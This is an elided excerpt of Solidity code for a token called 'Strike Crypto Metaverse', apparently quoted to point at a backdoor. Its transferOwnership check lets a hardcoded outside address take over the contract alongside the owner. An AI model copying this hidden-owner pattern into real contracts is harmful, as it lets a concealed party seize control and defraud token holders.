...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x652Da3AfACd46CF14752Ff3fAeF6508235b8D4Ec));
...
contract Strikecryptometaverse is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Strike Crypto Metaverse";
